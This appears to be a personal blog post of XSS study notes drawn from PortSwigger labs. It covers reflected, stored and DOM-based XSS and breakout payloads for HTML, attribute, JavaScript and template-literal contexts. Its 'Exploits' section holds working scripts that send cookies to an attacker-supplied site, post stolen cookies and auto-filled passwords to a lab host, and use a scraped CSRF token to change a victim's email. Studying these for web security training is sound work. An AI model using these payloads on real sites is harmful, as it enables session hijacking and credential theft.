---
layout: blog
type: blog
title: Web Application Security - Cross-Site Scripting
permalink: blog/web-xss
# All dates must be YYYY-MM-DD format!
date: 2021-11-15
labels:
  - reflected xss
  - stored xss
  - xss context
---

# Portswigger Cheat sheet

Note: regularly updated
[Cross-Site Scripting Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

XSS is possible in Javascript, VBScript, Flash and CSS

# Reflected XSS

Reflected XSS is the simplest variety of cross-site scripting. It arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way. 

Note: This can be checked for if it is noticed that http parameter data shows on the page.

# Stored XSS

Stored XSS (also known as persistent or second-order XSS) arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way. 

## Exploits

- Stealing cookies

```javasript
<script>
fetch('<your-site>', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
using CSRF
```javascript
<script>
window.onload = function exploit(){
	csrf =  document.getElementsByName("csrf")[0].value;
	
	postData = "csrf="+csrf+"&postId=7&comment="+document.cookie+"&name=pwned&email=nullcell@hacker.com&website=";
	Url='https://web-security-academy.net/post/comment';
	
	otherParam={
		body:postData,
		method:"POST",
	};

	fetch(Url,otherParam);
};
</script>
```
- Stealing passwords

These days, many users have password managers that auto-fill their passwords. You can take advantage of this by creating a password input, reading out the auto-filled password, and sending it to your own domain. This technique avoids most of the problems associated with stealing cookies, and can even gain access to every other account where the victim has reused the same password. 
```javascript
<form><input type=username id="username" name="username"></form>
<form><input type=password id="password" name="password"></form>

<script>
window.onload = function trigger(){
	setTimeout(function exploit(){
	csrf =  document.getElementsByName("csrf")[0].value;
	username = document.getElementById("username").value;
	password = document.getElementById("password").value;
	console.log(csrf)
	
	postData = "csrf="+csrf+"&postId=7&comment=Username: "+username+" Password: "+password+"&name=creds&email=nullcell@hacker.com&website=";
	Url='https://web-security-academy.net/post/comment';
	
	otherParam={
		body:postData,
		method:"POST",
	};

	fetch(Url,otherParam);
}, 2000);
};
</script>
```

- Bypass CSRF Protection (using regex to get CSRF token)

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=nullcell@hacker.com')
};
</script>
```

# DOM-based XSS

 DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as eval() or innerHTML. This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts.

To deliver a DOM-based XSS attack, you need to place data into a source so that it is propagated to a sink and causes execution of arbitrary JavaScript.

The most common source for DOM XSS is the URL, which is typically accessed with the window.location object. An attacker can construct a link to send a victim to a vulnerable page with a payload in the query string and fragment portions of the URL.

# XSS Contexts

When testing for reflected and stored XSS, a key task is to identify the XSS context:

-   The location within the response where attacker-controllable data appears.
-   Any input validation or other processing that is being performed on that data by the application.

Based on these details, you can then select one or more candidate XSS payloads, and test whether they are effective.

## XSS between HTML tags

When the XSS context is __text between HTML tags__, you need to introduce some new HTML tags designed to trigger execution of JavaScript.

Some useful ways of executing JavaScript are:

```html
<script>alert(document.domain)</script>  
<img src=1 onerror=alert(1)>
```

Burp Intruder can be used to fuzz for allowed tags if some are blocked.

## XSS in HTML tag attribute

When the XSS context is into an __HTML tag attribute value__, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one. For example:

`"><script>alert(document.domain)</script>`

More commonly in this situation, __angle brackets are blocked or encoded__, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. For example:

`" autofocus onfocus=alert(document.domain) x="`

Sometimes the XSS context is into a type of __HTML tag attribute that itself can create a scriptable context__. Here, you can execute JavaScript without needing to terminate the attribute value. For example, if the XSS context is into the `href` attribute of an anchor tag, you can use the `javascript` pseudo-protocol to execute script. For example:

`<a href="javascript:alert(document.domain)">`

__Canonical tag__ - You can exploit this behavior using access keys and user interaction on Chrome. Access keys allow you to provide keyboard shortcuts that reference a specific element. The `accesskey` attribute allows you to define a letter that, when pressed in combination with other keys (these vary across different platforms), will cause events to fire

## XSS into JavaScript

### Terminating the existing script

 it is possible to simply close the script tag that is enclosing the existing JavaScript, and introduce some new HTML tags that will trigger execution of JavaScript. For example, if the XSS context is as follows:

```html
<script>  
...  
var input = 'controllable data here';  
...  
</script>
```

then you can use the following payload to break out of the existing JavaScript and execute your own:

```html
</script><img src=1 onerror=alert(document.domain)>
```

### Breaking out of a JavaScript string

```javascript
'-alert(document.domain)-'  
';alert(document.domain)//

//Encoded
//suppose that the input:

';alert(document.domain)//

//gets converted to:

\';alert(document.domain)//

//You can now use the alternative payload:

\';alert(document.domain)//

//which gets converted to:

\\';alert(document.domain)//

```

### Making use of HTML-encoding

When the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around some input filters.

For example, if the XSS context is as follows:

```html
<a href="#" onclick="... var input='controllable data here'; ...">
```

and the application blocks or escapes single quote characters, you can use the following payload to break out of the JavaScript string and execute your own script:

`&apos;-alert(document.domain)-&apos;`

The `&apos;` sequence is an HTML entity representing an apostrophe or single quote. Because the browser HTML-decodes the value of the `onclick` attribute before the JavaScript is interpreted, the entities are decoded as quotes, which become string delimiters, and so the attack succeeds.

## XSS in javaScript template literals

 Template literals are encapsulated in backticks instead of normal quotation marks, and embedded expressions are identified using the `${...}` syntax.

For example, the following script will print a welcome message that includes the user's display name:

```javascript
document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
```

When the XSS context is into a JavaScript template literal, there is no need to terminate the literal. Instead, you simply need to use the `${...}` syntax to embed a JavaScript expression that will be executed when the literal is processed. For example, if the XSS context is as follows:

```javascript
<script>  
...  
var input = `controllable data here`;  
...  
</script>
```

then you can use the following payload to execute JavaScript without terminating the template literal:

`${alert(document.domain)}`

